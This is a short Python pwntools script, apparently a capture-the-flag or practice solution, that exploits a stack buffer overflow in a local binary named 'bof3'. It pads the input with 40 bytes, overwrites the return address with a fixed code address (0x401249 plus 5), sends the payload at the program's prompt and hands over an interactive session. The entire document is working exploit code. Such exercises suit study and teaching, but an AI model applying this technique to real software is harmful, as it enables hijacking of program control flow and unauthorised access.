from pwn import *

p = process('./bof3')

payload = b'A'*40 #

payload += p64(0x401249 + 5)

p.sendafter(b'> ', payload)

p.interactive()